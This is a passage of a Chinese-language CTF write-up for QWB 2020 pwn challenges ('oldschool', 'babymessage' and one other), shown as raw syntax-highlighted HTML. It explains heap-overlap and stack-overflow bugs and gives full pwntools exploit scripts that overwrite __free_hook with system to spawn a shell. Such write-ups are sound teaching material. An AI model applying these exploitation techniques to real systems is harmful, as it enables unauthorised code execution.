class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>open_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>这一段的作用是为后面的overlap构造好chunk，然后将0x100的tcache填满</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x110</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8040</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>然后dele掉chunk0，利用上溢通过chunk3修改chunk2的prev_size为opendir_chunk+chunk1+chunk0，将chunk2的size的prev_inuse位置0，然后dele掉chunk2，就会触发unlink，chunk2通过prev_size找到chunk0，而chunk1和opendir_chunk仍在使用状态，构造出chunkoverlap</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/18.jpg" alt=""></p><p>可以看到unsortedbin确实是从chunk0开始的</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">)</span></code></pre><p>这一段是错位分配chunk，使chunk1的fd被chunk2包含，同时使main_arena+88正好落入原本的“libc-2.27.so”的位置处</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/19.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/20.jpg" alt=""></p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这一段要填充空字符，否则只会输出三个字节</p><p>有了libc地址之后，dele掉chunk1，然后通过chunk2修改chunk1的fd指向free_hook，修改free_hook的值为system即可</p><h3 id="0x3-oldschool"><a href="#0x3-oldschool" class="headerlink" title="0x3.oldschool"></a>0x3.oldschool</h3><p>这题直接给的源码，编译方式为<code>Ubuntu 18.04, GCC -m32 -O3</code>，还需要安装一个gcc的编译环境</p><pre class=" language-shell"><code class="language-shell">apt-get install gcc-multilib</code></pre><p>编译命令中的-m32是编译为32位程序，-O3则是优化级别为3，将其编译之后在IDA中对照着源码进行审计</p><p>其中allocate、edit、show、dele、mmap_allocate编译前后没有发生什么变化，但mmap_edit中的if判断被优化掉了，如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//源码</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Mmap first!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unsigned</span> value<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> idx<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx <span class="token operator">&lt;</span> g_ptr <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ADDR_HIGH<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    value <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     g_ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//IDA反编译结果</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// edi</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-18h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_ptr <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1110<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>    v0 <span class="token operator">=</span> v2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xEFFFFFFF</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1110<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>LABEL_3<span class="token punctuation">:</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>源码中的</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx <span class="token operator">&lt;</span> g_ptr <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ADDR_HIGH<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>被优化为了</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xEFFFFFFF</span> <span class="token punctuation">)</span></code></pre><p>源码中的if条件限制了我们往mmap出的区域的下方写数据，而优化之后if则变为了或条件，我们只需满足<code>4 * v2 &gt;= 0</code>便可以往mmap下方写数据</p><p>所以这题我们只需要先填满tcache，然后用show泄露出libc地址，然后利用mmap_edit往free_hook写system即可</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./oldschool'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'oldschool'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mmap_allocate</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Where do you want to start: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Value: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>libc_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1d87d8</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>mmap_allocate<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token punctuation">(</span>free_hook<span class="token number">-0xe0000000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span>mmap_edit<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> system<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp里面解释一下这一句</p><pre class=" language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token punctuation">(</span>free_hook<span class="token number">-0xe0000000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span></code></pre><p>来源于IDA中的这一句</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span></code></pre><p>以及mmap的起始地址是<code>0xe0000000</code></p><h3 id="0x4-babymessage"><a href="#0x4-babymessage" class="headerlink" title="0x4.babymessage"></a>0x4.babymessage</h3><p>只开了NX保护，IDA分析</p><p>一共有三个功能，leave_name、leave_messgae和show</p><p>leave_name如下</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  byte_6010D0<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> byte_6010D0<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>往0x6010D0位置处写入四个字节</p><p>看到leave_message</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">leave_message</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"message: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  buf<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>注意到v3的位置在rbp-8处，可以往v3位置写入a1个字节，a1来源于v1</p><pre class=" language-c"><code class="language-c">v1 <span class="token operator">=</span> mm <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>    v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token function">leave_message</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>v1就是0x10，所以leave_message可以溢出到rbp，那么溢出到rbp有什么用，看到leave_message前面</p><pre class=" language-assembly"><code class="language-assembly">.text:0000000000400995 loc_400995:                             ; CODE XREF: work+72↑j.text:0000000000400995                 mov     eax, [rbp+var_4].text:0000000000400998                 mov     edi, eax.text:000000000040099A                 call    leave_message.text:000000000040099F                 jmp     short loc_40093F</code></pre><p>leave_message函数会将rbp-4处的值作为参数，也就是read函数能够读入的字节数</p><p>而leave_name功能中会往0x6010d0处写入四个字节，于是我们溢出到rbp，将rbp覆盖成0x6010d0+4，这样leave_message函数便会将name作为read函数能够读入的字节数，只要我们写入的name的值大于256，read就能够读入0x100个字节，之后就是正常的ret2libc了</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babymessage'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babymessage'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leave_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leave_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'message:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ac3</span>ret <span class="token operator">=</span> <span class="token 